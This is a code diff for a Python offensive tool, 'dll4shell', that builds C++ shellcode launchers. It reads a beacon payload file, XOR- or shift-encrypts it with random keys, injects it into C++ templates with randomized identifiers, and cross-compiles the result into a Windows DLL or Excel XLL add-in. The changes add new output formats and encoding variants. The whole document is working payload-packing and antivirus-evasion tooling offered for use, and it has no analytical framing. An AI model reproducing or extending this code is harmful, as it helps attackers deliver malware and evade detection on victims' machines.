@@ -13,7 +13,7 @@ def get_random_string():
     # print random string
     return result_str
 
-def xor(data):
+def xor(enctype, data):
     
     key = get_random_string()
     l = len(key)
@@ -24,21 +24,28 @@ def xor(data):
         current_key = key[i % len(key)]
         o = lambda x: x if isinstance(x, int) else ord(x) # handle data being bytes not string
         output_str += chr(o(current) ^ ord(current_key))
+    print(enctype)
 
-    ciphertext = '{ 0x' + ', 0x'.join(hex(ord(x))[2:] for x in output_str) + ' };'
+    if "1" in enctype:
+        ciphertext = '{ 0x' + ', 0x'.join(hex(ord(x))[2:] for x in output_str) + ' };'
+    else:
+        ciphertext = '\\x' + '\\x'.join(hex(ord(x))[2:] for x in output_str) + '\";'
     return ciphertext, key
 
-def shift(data):
+def shift(enctype, data):
     output_str = ""
 
     for i in range(len(data)):
         o = lambda x: x if isinstance(x, int) else ord(x)
         output_str += chr((o(data[i]) + 24) & 0xFF)
-
-    ciphertext = '{ 0x' + ', 0x'.join(hex(ord(x))[2:] for x in output_str) + ' };'
+    
+    if "1" in enctype:
+        ciphertext = '{ 0x' + ', 0x'.join(hex(ord(x))[2:] for x in output_str) + ' };'
+    else:
+        ciphertext = '\\x' + '\\x'.join(hex(ord(x))[2:] for x in output_str) + '\";'
     return ciphertext
 
-def dll4shell(enctype):
+def dll4shell(enctype, output):
     try:
         plaintext = open("beacon.bin", "rb").read() # read as bytes to deal with charset parsing issues
     except:
@@ -53,42 +60,32 @@ def dll4shell(enctype):
     
     e1 = get_random_string()
     
-    if enctype == "shift":
-        ciphertext = shift(plaintext)
+    if "shift" in enctype:
+        ciphertext = shift(enctype, plaintext)
     else:
         print("[*]                    Generating XOR Keys...                      [*]")
-        ciphertext, pl_key = xor(plaintext)
+        ciphertext, pl_key = xor(enctype, plaintext)
     
     print("[*]                    Replacing data in dll4shell.cpp...           [*]")
 
-    if enctype == "shift":
-        template = open("template-shift.cpp", "rt")
+    template = open("template-" + output + "-" + enctype + ".cpp", "rt")
 
-        data = template.read()
+    data = template.read()
 
-        data = data.replace('RunME', e1)
+    data = data.replace('RunME', e1)
 
+    if "1" in enctype:
         data = data.replace('unsigned char calc_payload[] = { };', 'unsigned char calc_payload[] = ' + ciphertext)
-        
-        data = data.replace('calc_payload', calc_name)
-
-        data = data.replace('calc_len', pl_key_size)
-
     else:
-        template = open("template-xor.cpp", "rt")
+        data = data.replace('const char calc_payload[] = { };', 'const char calc_payload[] = \"' + ciphertext)
+    
+    data = data.replace('calc_payload', calc_name)
 
-        data = template.read()
-
-        data = data.replace('RunME', e1)
-
-        data = data.replace('unsigned char calc_payload[] = { };', 'unsigned char calc_payload[] = ' + ciphertext)
-        
+    if "xor" in enctype:
         data = data.replace('char pl_key[] = "";', 'char pl_key[] = "' + pl_key + '";')
-        
-        data = data.replace('calc_payload', calc_name)
-        
+
         data = data.replace('pl_key', pl_key_name)
-        
+    
         data = data.replace('calc_len', pl_key_size)
     
     template.close()
@@ -104,10 +101,11 @@ def dll4shell(enctype):
 banner = """
 
 #############################################
+#
 #  Author: Sergey Egorov
+#
 #  C++ .DLL shellcode launcher
 #
-#  Based on Jinkun Ong's 'charlotte' tool
 #############################################
 """
 
@@ -116,22 +114,31 @@ def main():
     print(banner)
     
     parser = argparse.ArgumentParser(description='C++ shellcode launcher')
-    parser.add_argument("-e", "--encrypt",
+    parser.add_argument("-e", "--encryption",
                     dest="enc",
-                    help="Shellcode encryption type (xor or shift)",
+                    help="Shellcode encryption (xor, xor1, shift, shift1)",
                     default="xor",
                     action='store')
+    parser.add_argument("-o", "--output",
+                dest="out",
+                help="Output format (dll or xll)",
+                default="dll",
+                action='store')
 
     args = parser.parse_args()
 
-    e1 = dll4shell(args.enc)
+    try:
+        f = open("template-"+ args.out + "-" + args.enc + ".cpp")
+    except IOError:
+        print("Params combination does not exist. Check templates file names.")
+        sys.exit(1)
+    f.close()
+
+    e1 = dll4shell(args.enc,args.out)
+    
     print("[*]                    Completed - Compiling dll4shell.dll         [*]")
     time.sleep(1)
-    try:
-        os.system("x86_64-w64-mingw32-g++ -shared -o dll4shell.dll dll4shell.cpp -fpermissive >/dev/null 2>&1")
-        print("[*]                    Cross Compile Success!                      [*]")
-    except:
-        print("[*]                    Compilation failed :(                       [*]")
+    os.system("x86_64-w64-mingw32-g++ -shared -o dll4shell." + args.out + " dll4shell.cpp -fpermissive")
     time.sleep(1)
     print("[*]                    Removing dll4shell.cpp...                   [*]")
     os.system("rm dll4shell.cpp")
